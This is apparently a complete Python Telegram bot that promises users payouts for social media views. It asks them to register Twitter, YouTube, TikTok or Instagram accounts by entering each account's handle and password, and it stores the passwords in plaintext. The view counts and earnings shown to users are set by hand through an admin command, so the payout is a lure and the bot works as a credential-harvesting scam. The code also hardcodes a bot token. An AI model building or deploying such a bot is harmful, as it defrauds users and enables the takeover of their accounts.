import asyncio
import logging
import os
import sqlite3
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# --- CONFIGURATION ---
TOKEN = "9168926051:AAEbHLelqip2hh0NvkHpWDjPN55BevgvLUo"
ADMIN_IDS = [1438037591]

logging.basicConfig(level=logging.INFO)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
        telegram_username TEXT PRIMARY KEY,
        chat_id INTEGER,
        views INTEGER DEFAULT 0,
        money REAL DEFAULT 0.0
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS social_accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_username TEXT,
        platform TEXT,
        handle TEXT,
        password TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# --- STATES ---
class BotStates(StatesGroup):
    waiting_for_username = State()
    main_menu = State()
    entering_handle = State()
    entering_password = State()

reg_data = {}

# --- KEYBOARDS ---
def get_main_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Register Account", callback_data="menu_register")],
        [InlineKeyboardButton(text="📊 Stats", callback_data="menu_stats"),
         InlineKeyboardButton(text="🚀 Progress", callback_data="menu_progress")]
    ])

def get_platforms_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🐦 Twitter", callback_data="plat_Twitter"),
         InlineKeyboardButton(text="📺 YouTube", callback_data="plat_YouTube")],
        [InlineKeyboardButton(text="🎵 TikTok", callback_data="plat_TikTok"),
         InlineKeyboardButton(text="📸 Instagram", callback_data="plat_Instagram")],
        [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")]
    ])

# --- HANDLERS ---
async def start_command(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
    user = cursor.fetchone()
    conn.close()

    if user:
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"Welcome back, {user[0]}! Choose an option below:",
            reply_markup=get_main_menu_keyboard()
        )
    else:
        await state.set_state(BotStates.waiting_for_username)
        await message.answer(
            "Welcome! 🎉 To get started, please enter your Telegram username correctly using the **@** symbol (e.g., `@yourusername`):"
        )

async def process_username(message: types.Message, state: FSMContext):
    text = message.text.strip()
    if not text.startswith("@"):
        await message.answer("❌ Invalid format. Please make sure your username starts with the **@** symbol (e.g., `@yourusername`). Try again:")
        return

    telegram_username = text
    chat_id = message.chat.id

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT OR REPLACE INTO users (telegram_username, chat_id) VALUES (?, ?)", (telegram_username, chat_id))
        conn.commit()
    except Exception as e:
        logging.error(e)
    finally:
        conn.close()

    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Account registered successfully as **{telegram_username}**!",
        reply_markup=get_main_menu_keyboard()
    )

# --- MENU CALLBACKS ---
async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data
    await callback.answer()

    if data == "menu_register":
        await callback.message.edit_text(
            "Select the social media platform you want to register:",
            reply_markup=get_platforms_keyboard()
        )
    elif data == "menu_stats":
        chat_id = callback.message.chat.id
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("SELECT telegram_username, views, money FROM users WHERE chat_id = ?", (chat_id,))
        user = cursor.fetchone()
        conn.close()

        if user:
            _, views, money = user
            await callback.message.edit_text(
                f"📊 **Your Stats**\n\n"
                f"👁️ Total Views: **{views:,}**\n"
                f"💰 Total Earnings: **${money:.2f}**",
                reply_markup=get_main_menu_keyboard()
            )
        else:
            await callback.message.edit_text(
                "Please type /start to register your username first.",
                reply_markup=get_main_menu_keyboard()
            )
    elif data == "menu_progress":
        chat_id = callback.message.chat.id
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("SELECT views FROM users WHERE chat_id = ?", (chat_id,))
        user = cursor.fetchone()
        conn.close()

        if user:
            views = user[0]
            goal = 50000
            percent = min(100, (views / goal) * 100)
            status = "✅ **Eligible for Payout!**" if views >= goal else f"❌ Needs **{goal - views:,}** more views for payout."
            
            progress_bar = "█" * int(percent // 10) + "░" * (10 - int(percent // 10))

            await callback.message.edit_text(
                f"🚀 **Payout Progress**\n\n"
                f"Progress: [{progress_bar}] {percent:.1f}%\n"
                f"Current Views: **{views:,} / {goal:,}**\n\n"
                f"Status: {status}",
                reply_markup=get_main_menu_keyboard()
            )
        else:
            await callback.message.edit_text(
                "Please type /start to register your username first.",
                reply_markup=get_main_menu_keyboard()
            )
    elif data == "back_to_menu":
        await callback.message.edit_text(
            "Main Menu:",
            reply_markup=get_main_menu_keyboard()
        )

# --- SOCIAL REGISTRATION FLOW ---
async def platform_selected(callback: types.CallbackQuery, state: FSMContext):
    platform = callback.data.split("_")[1]
    chat_id = callback.message.chat.id
    reg_data[chat_id] = {"platform": platform}
    
    await state.set_state(BotStates.entering_handle)
    await callback.message.edit_text(
        f"You selected **{platform}**.\n\nPlease enter your username or handle for this account (e.g., `@handle` or profile link):"
    )

async def process_handle(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    handle = message.text.strip()
    if chat_id not in reg_data:
        reg_data[chat_id] = {}
    reg_data[chat_id]["handle"] = handle

    await state.set_state(BotStates.entering_password)
    await message.answer("🔑 Please enter the password for this account:")

async def process_password(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    password = message.text.strip()
    platform = reg_data[chat_id].get("platform")
    handle = reg_data[chat_id].get("handle")

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_username FROM users WHERE chat_id = ?", (chat_id,))
    res = cursor.fetchone()
    
    if res:
        telegram_username = res[0]
        cursor.execute(
            "INSERT INTO social_accounts (telegram_username, platform, handle, password) VALUES (?, ?, ?, ?)",
            (telegram_username, platform, handle, password)
        )
        conn.commit()
    conn.close()

    if chat_id in reg_data:
        del reg_data[chat_id]

    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Successfully registered **{platform}** account (**{handle}**)!",
        reply_markup=get_main_menu_keyboard()
    )

# --- ADMIN COMMAND: UPDATE STATS ---
async def update_stats_command(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = message.text.split()
    if len(parts) != 4:
        await message.answer("⚠️ Incorrect usage.\nFormat: `/update @username views money`\nExample: `/update @johndoe 55000 100`", parse_mode="Markdown")
        return

    target_username = parts[1]
    try:
        new_views = int(parts[2])
        new_money = float(parts[3])
    except ValueError:
        await message.answer("⚠️ Views must be an integer and money must be a number.")
        return

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET views = ?, money = ? WHERE telegram_username = ?", (new_views, new_money, target_username))
    if cursor.rowcount == 0:
        conn.close()
        await message.answer(f"❌ User `{target_username}` not found in database.", parse_mode="Markdown")
        return
    conn.commit()
    conn.close()

    await message.answer(f"✅ Successfully updated stats for **{target_username}**:\n👁️ Views: {new_views:,}\n💰 Money: ${new_money:.2f}")

# --- DUMMY WEB SERVER FOR RENDER FREE TIER ---
async def handle_ping(request):
    return web.Response(text="Bot is alive!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# --- MAIN SETUP ---
async def main():
    await start_web_server()
    bot = Bot(token=TOKEN)
    dp = Dispatcher()

    dp.message.register(start_command, Command("start"))
    dp.message.register(update_stats_command, Command("update"))
    dp.message.register(process_username, BotStates.waiting_for_username)
    dp.message.register(process_handle, BotStates.entering_handle)
    dp.message.register(process_password, BotStates.entering_password)
    
    dp.callback_query.register(menu_callback_router, BotStates.main_menu, F.data.startswith("menu_") | F.data == "back_to_menu")
    dp.callback_query.register(platform_selected, BotStates.main_menu, F.data.startswith("plat_"))

    print("🤖 Bot is up and running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
